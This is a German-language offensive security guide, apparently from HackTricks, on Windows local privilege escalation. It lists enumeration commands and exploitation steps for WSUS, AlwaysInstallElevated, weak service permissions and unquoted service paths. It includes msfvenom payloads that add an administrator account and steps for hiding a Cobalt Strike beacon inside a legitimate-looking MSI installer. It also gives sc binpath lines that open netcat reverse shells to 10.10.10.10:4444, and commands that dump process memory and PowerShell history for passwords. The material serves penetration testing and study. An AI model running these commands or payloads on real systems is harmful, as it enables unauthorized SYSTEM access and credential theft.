# Windows Local Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

### **Bestes Tool zur Suche nach Windows-Privilegieneskalationsvektoren:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

## Initiale Windows-Theorie

### Zugriffstoken

**Wenn Sie nicht wissen, was Windows-Zugriffstoken sind, lesen Sie die folgende Seite, bevor Sie fortfahren:**

{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**Überprüfen Sie die folgende Seite für weitere Informationen zu ACLs - DACLs/SACLs/ACEs:**

{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Integritätsstufen

**Wenn Sie nicht wissen, was Integritätsstufen in Windows sind, sollten Sie die folgende Seite lesen, bevor Sie fortfahren:**

{{#ref}}
integrity-levels.md
{{#endref}}

## Windows-Sicherheitskontrollen

Es gibt verschiedene Dinge in Windows, die **Sie daran hindern könnten, das System zu enumerieren**, ausführbare Dateien auszuführen oder sogar **Ihre Aktivitäten zu erkennen**. Sie sollten die folgende **Seite** **lesen** und alle diese **Abwehrmechanismen** **enumerieren**, bevor Sie mit der Privilegieneskalation beginnen:

{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

## Systeminformationen

### Versionsinformationen enumerieren

Überprüfen Sie, ob die Windows-Version bekannte Schwachstellen aufweist (überprüfen Sie auch die angewendeten Patches).
```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
### Version Exploits

Diese [Seite](https://msrc.microsoft.com/update-guide/vulnerability) ist nützlich, um detaillierte Informationen über Microsoft-Sicherheitsanfälligkeiten zu suchen. Diese Datenbank enthält mehr als 4.700 Sicherheitsanfälligkeiten und zeigt die **massive Angriffsfläche**, die eine Windows-Umgebung bietet.

**Auf dem System**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas hat watson eingebettet)_

**Lokal mit Systeminformationen**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Github-Repos von Exploits:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Environment

Gibt es Anmeldeinformationen/saftige Informationen, die in den Umgebungsvariablen gespeichert sind?
```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```
### PowerShell-Historie
```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
### PowerShell-Transkriptdateien

Sie können lernen, wie Sie dies aktivieren, in [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)
```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```
### PowerShell-Modulprotokollierung

Details zu PowerShell-Pipeline-Ausführungen werden aufgezeichnet, einschließlich ausgeführter Befehle, Befehlsaufrufe und Teile von Skripten. Es könnten jedoch nicht alle Ausführungsdetails und Ausgabeergebnisse erfasst werden.

Um dies zu aktivieren, folgen Sie den Anweisungen im Abschnitt "Transkriptdateien" der Dokumentation und wählen Sie **"Modulprotokollierung"** anstelle von **"Powershell-Transkription"**.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
Um die letzten 15 Ereignisse aus den Powershell-Protokollen anzuzeigen, können Sie ausführen:
```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```
### PowerShell **Script Block Logging**

Ein vollständiger Aktivitäts- und Inhaltsnachweis der Ausführung des Skripts wird erfasst, wodurch sichergestellt wird, dass jeder Codeblock dokumentiert wird, während er ausgeführt wird. Dieser Prozess bewahrt eine umfassende Prüfspur jeder Aktivität, die für die Forensik und die Analyse böswilligen Verhaltens wertvoll ist. Durch die Dokumentation aller Aktivitäten zum Zeitpunkt der Ausführung werden detaillierte Einblicke in den Prozess bereitgestellt.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
Die Protokollereignisse für das Script Block können im Windows-Ereignisanzeiger unter dem Pfad: **Anwendungs- und Dienstprotokolle > Microsoft > Windows > PowerShell > Betrieb** gefunden werden.\
Um die letzten 20 Ereignisse anzuzeigen, können Sie Folgendes verwenden:
```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
### Internet-Einstellungen
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
### Laufwerke
```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
## WSUS

Sie können das System kompromittieren, wenn die Updates nicht über http**S**, sondern über http angefordert werden.

Sie beginnen damit, zu überprüfen, ob das Netzwerk ein nicht-SSL WSUS-Update verwendet, indem Sie Folgendes ausführen:
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
Wenn Sie eine Antwort erhalten wie:
```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```
Und wenn `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` gleich `1` ist.

Dann ist **es ausnutzbar.** Wenn der letzte Registrierungseintrag gleich 0 ist, wird der WSUS-Eintrag ignoriert.

Um diese Schwachstellen auszunutzen, können Sie Tools wie: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus) verwenden - dies sind MiTM-waffenfähige Exploit-Skripte, um 'falsche' Updates in nicht-SSL WSUS-Verkehr einzuschleusen.

Lesen Sie die Forschung hier:

{% file src="../../images/CTX_WSUSpect_White_Paper (1).pdf" %}

**WSUS CVE-2020-1013**

[**Lesen Sie den vollständigen Bericht hier**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).\
Im Grunde ist dies der Fehler, den dieser Bug ausnutzt:

> Wenn wir die Möglichkeit haben, unseren lokalen Benutzerproxy zu ändern, und Windows Updates den im Internet Explorer konfigurierten Proxy verwendet, haben wir daher die Möglichkeit, [PyWSUS](https://github.com/GoSecure/pywsus) lokal auszuführen, um unseren eigenen Verkehr abzufangen und Code als erhöhter Benutzer auf unserem Asset auszuführen.
>
> Darüber hinaus verwendet der WSUS-Dienst die Einstellungen des aktuellen Benutzers, daher wird auch dessen Zertifikatspeicher verwendet. Wenn wir ein selbstsigniertes Zertifikat für den WSUS-Hostnamen generieren und dieses Zertifikat in den Zertifikatspeicher des aktuellen Benutzers einfügen, können wir sowohl HTTP- als auch HTTPS-WSUS-Verkehr abfangen. WSUS verwendet keine HSTS-ähnlichen Mechanismen, um eine Validierung des Zertifikats nach dem Prinzip "Vertrauen bei erster Nutzung" zu implementieren. Wenn das präsentierte Zertifikat vom Benutzer vertraut wird und den richtigen Hostnamen hat, wird es vom Dienst akzeptiert.

Sie können diese Schwachstelle mit dem Tool [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) ausnutzen (sobald es freigegeben ist).

## KrbRelayUp

Eine **lokale Privilegieneskalation**-Schwachstelle existiert in Windows **Domänen**-Umgebungen unter bestimmten Bedingungen. Diese Bedingungen umfassen Umgebungen, in denen **LDAP-Signierung nicht durchgesetzt wird,** Benutzer Selbstrechte besitzen, die es ihnen ermöglichen, **ressourcenbasierte eingeschränkte Delegation (RBCD)** zu konfigurieren, und die Fähigkeit für Benutzer, Computer innerhalb der Domäne zu erstellen. Es ist wichtig zu beachten, dass diese **Anforderungen** mit **Standard-Einstellungen** erfüllt sind.

Finden Sie den **Exploit in** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

Für weitere Informationen über den Ablauf des Angriffs überprüfen Sie [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)

## AlwaysInstallElevated

**Wenn** diese 2 Registrierungen **aktiviert** sind (Wert ist **0x1**), können Benutzer mit beliebigen Berechtigungen `*.msi`-Dateien als NT AUTHORITY\\**SYSTEM** **installieren** (ausführen).
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### Metasploit-Payloads
```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
```
Wenn Sie eine Meterpreter-Sitzung haben, können Sie diese Technik mit dem Modul **`exploit/windows/local/always_install_elevated`** automatisieren.

### PowerUP

Verwenden Sie den Befehl `Write-UserAddMSI` von PowerUP, um im aktuellen Verzeichnis eine Windows MSI-Binärdatei zu erstellen, um Privilegien zu eskalieren. Dieses Skript erstellt einen vorkompilierten MSI-Installer, der nach einer Benutzer-/Gruppenzuordnung fragt (Sie benötigen also GUI-Zugriff):
```
Write-UserAddMSI
```
Führen Sie einfach die erstellte Binärdatei aus, um die Berechtigungen zu eskalieren.

### MSI Wrapper

Lesen Sie dieses Tutorial, um zu lernen, wie man einen MSI-Wrapper mit diesen Tools erstellt. Beachten Sie, dass Sie eine "**.bat**"-Datei einwickeln können, wenn Sie **nur** **Befehlszeilen** **ausführen** möchten.

{{#ref}}
msi-wrapper.md
{{#endref}}

### Erstellen Sie MSI mit WIX

{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Erstellen Sie MSI mit Visual Studio

- **Generieren** Sie mit Cobalt Strike oder Metasploit eine **neue Windows EXE TCP Payload** in `C:\privesc\beacon.exe`
- Öffnen Sie **Visual Studio**, wählen Sie **Ein neues Projekt erstellen** und geben Sie "installer" in das Suchfeld ein. Wählen Sie das Projekt **Setup Wizard** und klicken Sie auf **Weiter**.
- Geben Sie dem Projekt einen Namen, wie **AlwaysPrivesc**, verwenden Sie **`C:\privesc`** für den Speicherort, wählen Sie **Lösung und Projekt im selben Verzeichnis platzieren** und klicken Sie auf **Erstellen**.
- Klicken Sie weiter auf **Weiter**, bis Sie zu Schritt 3 von 4 (Dateien auswählen) gelangen. Klicken Sie auf **Hinzufügen** und wählen Sie die gerade generierte Beacon-Payload aus. Klicken Sie dann auf **Fertigstellen**.
- Markieren Sie das Projekt **AlwaysPrivesc** im **Solution Explorer** und ändern Sie in den **Eigenschaften** **TargetPlatform** von **x86** auf **x64**.
- Es gibt andere Eigenschaften, die Sie ändern können, wie **Author** und **Manufacturer**, die die installierte App legitimer erscheinen lassen können.
- Klicken Sie mit der rechten Maustaste auf das Projekt und wählen Sie **Ansicht > Benutzerdefinierte Aktionen**.
- Klicken Sie mit der rechten Maustaste auf **Installieren** und wählen Sie **Benutzerdefinierte Aktion hinzufügen**.
- Doppelklicken Sie auf **Anwendungsordner**, wählen Sie Ihre **beacon.exe**-Datei aus und klicken Sie auf **OK**. Dies stellt sicher, dass die Beacon-Payload ausgeführt wird, sobald der Installer gestartet wird.
- Ändern Sie unter den **Eigenschaften der benutzerdefinierten Aktion** **Run64Bit** auf **True**.
- Schließlich **bauen** Sie es.
- Wenn die Warnung `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'` angezeigt wird, stellen Sie sicher, dass Sie die Plattform auf x64 eingestellt haben.

### MSI-Installation

Um die **Installation** der bösartigen `.msi`-Datei im **Hintergrund** auszuführen:
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```
Um diese Schwachstelle auszunutzen, können Sie verwenden: _exploit/windows/local/always_install_elevated_

## Antivirus und Detektoren

### Audit-Einstellungen

Diese Einstellungen entscheiden, was **protokolliert** wird, daher sollten Sie darauf achten
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
### WEF

Windows Event Forwarding, es ist interessant zu wissen, wohin die Protokolle gesendet werden.
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```
### LAPS

**LAPS** ist für die **Verwaltung von lokalen Administratorpasswörtern** konzipiert, wobei sichergestellt wird, dass jedes Passwort **einzigartig, zufällig und regelmäßig aktualisiert** wird auf Computern, die einer Domäne beigetreten sind. Diese Passwörter werden sicher in Active Directory gespeichert und können nur von Benutzern abgerufen werden, die über ausreichende Berechtigungen durch ACLs verfügen, die es ihnen ermöglichen, lokale Admin-Passwörter einzusehen, wenn sie autorisiert sind.

{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

Wenn aktiv, werden **Klartextpasswörter in LSASS** (Local Security Authority Subsystem Service) gespeichert.\
[**Weitere Informationen zu WDigest auf dieser Seite**](../stealing-credentials/credentials-protections.md#wdigest).
```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```
### LSA-Schutz

Beginnend mit **Windows 8.1** führte Microsoft einen verbesserten Schutz für die Local Security Authority (LSA) ein, um **Versuche** untrusted Prozesse zu **blockieren**, ihren Speicher **zu lesen** oder Code zu injizieren, was das System weiter absichert.\
[**Weitere Informationen zum LSA-Schutz hier**](../stealing-credentials/credentials-protections.md#lsa-protection).
```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```
### Credentials Guard

**Credential Guard** wurde in **Windows 10** eingeführt. Sein Zweck ist es, die auf einem Gerät gespeicherten Anmeldeinformationen vor Bedrohungen wie Pass-the-Hash-Angriffen zu schützen.| [**Weitere Informationen zu Credentials Guard hier.**](../stealing-credentials/credentials-protections.md#credential-guard)
```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```
### Cached Credentials

**Domänenanmeldeinformationen** werden von der **Local Security Authority** (LSA) authentifiziert und von Betriebssystemkomponenten verwendet. Wenn die Anmeldedaten eines Benutzers von einem registrierten Sicherheits-Paket authentifiziert werden, werden normalerweise Domänenanmeldeinformationen für den Benutzer erstellt.\
[**More info about Cached Credentials here**](../stealing-credentials/credentials-protections.md#cached-credentials).
```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```
## Benutzer & Gruppen

### Benutzer & Gruppen auflisten

Sie sollten überprüfen, ob eine der Gruppen, zu denen Sie gehören, interessante Berechtigungen hat.
```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
### Privilegierte Gruppen

Wenn Sie **zu einer privilegierten Gruppe gehören, können Sie möglicherweise Privilegien eskalieren**. Erfahren Sie hier mehr über privilegierte Gruppen und wie man sie missbraucht, um Privilegien zu eskalieren:

{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Token-Manipulation

**Erfahren Sie mehr** darüber, was ein **Token** ist, auf dieser Seite: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
Überprüfen Sie die folgende Seite, um **mehr über interessante Tokens zu erfahren** und wie man sie missbraucht:

{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### Eingeloggte Benutzer / Sitzungen
```bash
qwinsta
klist sessions
```
### Home-Verzeichnisse
```powershell
dir C:\Users
Get-ChildItem C:\Users
```
### Passwort-Richtlinie
```bash
net accounts
```
### Den Inhalt der Zwischenablage abrufen
```bash
powershell -command "Get-Clipboard"
```
## Ausgeführte Prozesse

### Datei- und Ordners Berechtigungen

Zuerst sollten Sie die Prozesse **auf Passwörter in der Befehlszeile des Prozesses überprüfen**.\
Überprüfen Sie, ob Sie **eine laufende Binärdatei überschreiben** können oder ob Sie Schreibberechtigungen für den Binärordner haben, um mögliche [**DLL Hijacking-Angriffe**](dll-hijacking/index.html) auszunutzen:
```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
Überprüfen Sie immer, ob mögliche [**electron/cef/chromium-Debugger** ausgeführt werden, die Sie missbrauchen könnten, um Privilegien zu eskalieren](../../linux-hardening/privilege-escalation/electron-cef-chromium-debugger-abuse.md).

**Überprüfen der Berechtigungen der Prozess-Binärdateien**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```
**Überprüfung der Berechtigungen der Ordner der Prozess-Binärdateien (**[**DLL Hijacking**](dll-hijacking/index.html)**)**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```
### Memory Password mining

Sie können einen Speicherabbild eines laufenden Prozesses mit **procdump** von Sysinternals erstellen. Dienste wie FTP haben die **Anmeldeinformationen im Klartext im Speicher**, versuchen Sie, den Speicher abzuleiten und die Anmeldeinformationen zu lesen.
```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```
### Unsichere GUI-Apps

**Anwendungen, die als SYSTEM ausgeführt werden, können einem Benutzer erlauben, eine CMD zu starten oder Verzeichnisse zu durchsuchen.**

Beispiel: "Windows-Hilfe und -Support" (Windows + F1), suchen Sie nach "Eingabeaufforderung", klicken Sie auf "Klicken Sie hier, um die Eingabeaufforderung zu öffnen"

## Dienste

Holen Sie sich eine Liste der Dienste:
```bash
net start
wmic service list brief
sc query
Get-Service
```
### Berechtigungen

Sie können **sc** verwenden, um Informationen zu einem Dienst zu erhalten.
```bash
sc qc <service_name>
```
Es wird empfohlen, die Binärdatei **accesschk** von _Sysinternals_ zu haben, um das erforderliche Berechtigungsniveau für jeden Dienst zu überprüfen.
```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```
Es wird empfohlen zu überprüfen, ob "Authentifizierte Benutzer" einen Dienst ändern können:
```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
[Sie können accesschk.exe für XP hier herunterladen](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Dienst aktivieren

Wenn Sie diesen Fehler haben (zum Beispiel mit SSDPSRV):

_Systemfehler 1058 ist aufgetreten._\
&#xNAN;_&#x54;der Dienst kann nicht gestartet werden, entweder weil er deaktiviert ist oder weil keine aktivierten Geräte damit verbunden sind._

Sie können ihn aktivieren, indem Sie
```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
**Beachten Sie, dass der Dienst upnphost von SSDPSRV abhängt, um zu funktionieren (für XP SP1)**

**Eine weitere Lösung** dieses Problems besteht darin, Folgendes auszuführen:
```
sc.exe config usosvc start= auto
```
### **Ändern des Dienst-Binärpfads**

In dem Szenario, in dem die Gruppe "Authentifizierte Benutzer" **SERVICE_ALL_ACCESS** für einen Dienst besitzt, ist die Modifikation der ausführbaren Binärdatei des Dienstes möglich. Um **sc** zu modifizieren und auszuführen:
```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```
### Dienst neu starten
```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```
Berechtigungen können durch verschiedene Berechtigungen erhöht werden:

- **SERVICE_CHANGE_CONFIG**: Ermöglicht die Neukonfiguration der Dienstbinary.
- **WRITE_DAC**: Ermöglicht die Neukonfiguration von Berechtigungen, was zur Fähigkeit führt, Dienstkonfigurationen zu ändern.
- **WRITE_OWNER**: Erlaubt den Erwerb von Eigentum und die Neukonfiguration von Berechtigungen.
- **GENERIC_WRITE**: Erbt die Fähigkeit, Dienstkonfigurationen zu ändern.
- **GENERIC_ALL**: Erbt ebenfalls die Fähigkeit, Dienstkonfigurationen zu ändern.

Für die Erkennung und Ausnutzung dieser Schwachstelle kann das _exploit/windows/local/service_permissions_ verwendet werden.

### Schwache Berechtigungen von Dienstbinaries

**Überprüfen Sie, ob Sie die Binary, die von einem Dienst ausgeführt wird, ändern können** oder ob Sie **Schreibberechtigungen für den Ordner** haben, in dem sich die Binary befindet ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
Sie können jede Binary, die von einem Dienst ausgeführt wird, mit **wmic** (nicht in system32) abrufen und Ihre Berechtigungen mit **icacls** überprüfen:
```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
Sie können auch **sc** und **icacls** verwenden:
```bash
sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
### Dienste-Registry-Berechtigungen ändern

Sie sollten überprüfen, ob Sie eine Dienst-Registry ändern können.\
Sie können Ihre Berechtigungen über eine Dienst-Registry überprüfen, indem Sie:
```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```
Es sollte überprüft werden, ob **Authenticated Users** oder **NT AUTHORITY\INTERACTIVE** `FullControl`-Berechtigungen besitzen. Falls ja, kann die von dem Dienst ausgeführte Binärdatei geändert werden.

Um den Pfad der ausgeführten Binärdatei zu ändern:
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### Berechtigungen für AppendData/AddSubdirectory im Diensteregister

Wenn Sie diese Berechtigung über ein Register haben, bedeutet dies, dass **Sie Unterregister von diesem erstellen können**. Im Fall von Windows-Diensten ist dies **ausreichend, um beliebigen Code auszuführen:**

{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Unquoted Service Paths

Wenn der Pfad zu einer ausführbaren Datei nicht in Anführungszeichen steht, wird Windows versuchen, jede Endung vor einem Leerzeichen auszuführen.

Zum Beispiel wird Windows für den Pfad _C:\Program Files\Some Folder\Service.exe_ versuchen, Folgendes auszuführen:
```powershell
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```
Liste alle nicht zitierten Dienstpfade auf, die nicht zu integrierten Windows-Diensten gehören:
```powershell
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows\\" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\\Windows\\system32\\" |findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```powershell
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:""""') do (
echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
)
)
```

```powershell
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
**Sie können diese Schwachstelle mit Metasploit erkennen und ausnutzen:** `exploit/windows/local/trusted\_service\_path` Sie können manuell eine Dienst-Binärdatei mit Metasploit erstellen:
```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
### Recovery Actions

Windows ermöglicht es Benutzern, Aktionen festzulegen, die ergriffen werden sollen, wenn ein Dienst fehlschlägt. Diese Funktion kann so konfiguriert werden, dass sie auf eine Binärdatei verweist. Wenn diese Binärdatei ersetzbar ist, könnte eine Privilegieneskalation möglich sein. Weitere Details finden Sie in der [offiziellen Dokumentation](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>).

## Applications

### Installed Applications

Überprüfen Sie **die Berechtigungen der Binärdateien** (vielleicht können Sie eine überschreiben und Privilegien eskalieren) und der **Ordner** ([DLL Hijacking](dll-hijacking/index.html)).
```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
### Schreibberechtigungen

Überprüfen Sie, ob Sie eine Konfigurationsdatei ändern können, um eine spezielle Datei zu lesen, oder ob Sie eine Binärdatei ändern können, die von einem Administratorkonto (schedtasks) ausgeführt wird.

Eine Möglichkeit, schwache Ordner-/Dateiberechtigungen im System zu finden, besteht darin, Folgendes zu tun:
```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
